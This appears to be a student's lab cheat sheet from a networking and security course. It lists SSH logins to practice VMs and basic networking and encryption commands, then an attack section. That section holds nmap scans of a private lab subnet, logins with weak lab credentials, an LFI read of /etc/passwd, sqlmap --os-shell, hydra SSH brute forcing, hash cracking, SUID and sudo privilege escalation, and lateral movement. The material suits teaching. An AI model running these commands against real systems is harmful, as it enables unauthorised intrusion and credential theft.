# VIRTUAL MACHINES SSH COMMANDS
```
# 1
ssh ubuntu@ozone-hang-harold-fleet.trycloudflare.com

# 2 
ssh ubuntu@compile-postcard-lodge-computed.trycloudflare.com

# 3
ssh ubuntu@higher-walnut-item-received.trycloudflare.com

# 4
ssh ubuntu@trailer-specializing-travesti-cam.trycloudflare.com

# 5
ssh ubuntu@drop-stay-defines-cal.trycloudflare.com

# 6
ssh ubuntu@diana-really-saving-jun.trycloudflare.com

# 7
ssh ubuntu@referral-create-offices-growth.trycloudflare.com

# 8
ssh ubuntu@dan-subaru-awareness-starsmerchant.trycloudflare.com

# 9
ssh ubuntu@isp-helicopter-assistance-pond.trycloudflare.com

# 10
ssh ubuntu@this-felt-downloading-carries.trycloudflare.com

# 11
ssh ubuntu@oakland-diversity-fcc-bag.trycloudflare.com

# 12
ssh ubuntu@database-sheep-collector-trance.trycloudflare.com

# 13
ssh ubuntu@zope-jennifer-executive-slow.trycloudflare.com

# 14
ssh ubuntu@discounts-fridge-assignment-him.trycloudflare.com

# 15
ssh ubuntu@fuzzy-locations-backup-cycles.trycloudflare.com

# 16
ssh ubuntu@rosa-medical-toronto-cayman.trycloudflare.com

# 17
ssh ubuntu@postage-safer-firewall-bizarre.trycloudflare.com

# 18
ssh ubuntu@device-suits-effects-screenshots.trycloudflare.com

# 19
ssh ubuntu@metropolitan-picks-isle-opponent.trycloudflare.com

# 20
ssh ubuntu@provinces-updates-valentine-angel.trycloudflare.com
```

# HOW DATA TRAVELS
```
sudo tcpdump -i any # Capture and display network traffic
netstat -s # Show network statistics
route -n # View routing table
```

# IP ADDRESSES
```
ifconfig #this or below(I prefer this)
ip a # Show IP and MAC addresses
hostname -I # Show your IP address
nslookup google.com # Translate domain to IP see if network is set
curl ifconfig.me # Get your public IP
```

# ROUTING
```
traceroute google.com # Show each hop packets take
ping google.com # Test if host is reachable
ip route show # View routing table
```

# KEY PROTOCOLS
```
ssh student@10.163.217.123 # SSH to a VM 
scp file.txt user@host:/path/ # Copy file to remote server
ss -tuln # List all open ports
netstat -tuln # Show listening ports and connections
```

# PORTS & FIREWALLS
```
ss -tuln # Show all open ports
sudo ufw status # Check firewall status
sudo ufw allow 22 # Allow SSH port
sudo ufw deny 23 # Block Telnet port
sudo ufw enable # Turn on firewall
```

# MAC ADDRESSES & SERVER-CLIENT MODEL
```
ip link show # Show MAC addresses
arp -a # Show IP to MAC mappings
ssh-keygen -t rsa -b 4096 # Generate SSH key pair
ssh-copy-id user@host # Copy SSH key to server
```

# ENCRYPTION
```
gpg --encrypt --recipient user@email.com file.txt # Encrypt with public key
gpg --decrypt file.txt.gpg # Decrypt file
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc # Encrypt with AES
openssl enc -d -aes-256-cbc -in file.enc -out file.txt # Decrypt AES file
```

# QUANTUM COMPUTING
```
openssl list-cipher-algorithms # List encryption algorithms
```

# SECURING PATHWAYS
```
sudo -i # Switch to root user
sudo -l # List sudo permissions
passwd # Change your password
find / -perm -4000 2>/dev/null # Find SUID binaries
sudo /bin/cat /root/flag3.txt # Read root flag with sudo
```

# RECONNAISSANCE - FIND YOUR NETWORK
```
ifconfig # Show network interfaces
ip a # Display IP addresses
ip a | grep -E 'inet ' | grep -v 127.0.0.1 # Show your local IP
```

# NMAP PORT SCANNING
```
nmap -sn 10.163.217.0/24 # Ping scan - find all live hosts on network
nmap -F 10.163.217.123 # Quick scan - top 1000 ports
nmap -sV -F 10.163.217.123 # Service scan - detect versions on top ports
nmap -sV -p21,22,23,80,443,3306,5432,139,445 10.163.217.123 # Scan specific common ports
nmap -p- 10.163.217.123 # Full port scan - all 65535 ports
nmap -A 10.163.217.123 # Aggressive scan - OS, versions, scripts
nmap --open 10.163.217.123 # Show only open ports
nmap -sU -p 53,68,123,161 10.163.217.123 # UDP scan - common UDP ports
nmap -sC -sV 10.163.217.123 # Default scripts with version detection
nmap -sV -p- 10.163.217.123 -oN scan.txt # Full scan - save results to file
```

# SERVICE ENUMERATION
```
ftp 10.163.217.123 # Connect to FTP (anonymous access)
telnet 10.163.217.123 # Connect via Telnet (student:password123)
curl http://10.163.217.123/lfi.php?file=/etc/passwd # LFI vulnerability test
mysql -h 10.163.217.123 -u root -ppassword # Connect to MySQL (root:password)
psql -h 10.163.217.123 -U postgres -d bank # Connect to PostgreSQL (postgres:postgres)
smbclient //10.163.217.123/share -N # Connect to SMB share (guest access)
```

# VULNERABILITY SCANNING
```
nikto -h http://10.163.217.123 # Web vulnerability scanner
sqlmap -u "http://10.163.217.123/cmd.php?cmd=id" --os-shell # SQL injection to get shell
gobuster dir -u http://10.163.217.123 -w /usr/share/wordlists/dirb/common.txt # Directory brute force
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://10.163.217.123 # SSH password brute force
john hashes.txt # Crack password hashes
```

# PRIVILEGE ESCALATION
```
sudo -l # Check sudo permissions
find / -perm -4000 2>/dev/null # Find SUID binaries
sudo /bin/bash # Get root shell via sudo misconfiguration
```

# LATERAL MOVEMENT
```
ssh student@10.163.217.122 # SSH to another VM
scp file.txt student@10.163.217.122:/home/student/ # Copy file to another VM
```